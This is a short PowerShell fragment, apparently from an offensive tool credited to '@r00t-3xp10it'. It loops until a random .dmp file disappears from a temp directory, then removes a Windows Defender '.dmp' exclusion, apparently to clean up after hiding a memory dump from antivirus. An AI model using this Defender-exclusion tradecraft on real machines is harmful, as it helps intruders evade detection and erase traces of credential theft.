...
While($true)
{
   ...
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete extension exclusion from defender

   .NOTES
      This function runs in loop checking if dump.dmp file
      is present in %tmp% directory. If not, then it deletes
      the exclusion from Windows Defender and exit execution.
   #>

   If(-not(Test-Path -Path "$Storage\$RandName.dmp"))
   {
      Remove-MpPreference -ExclusionExtension ".dmp" -Force
      Return   
   }
}
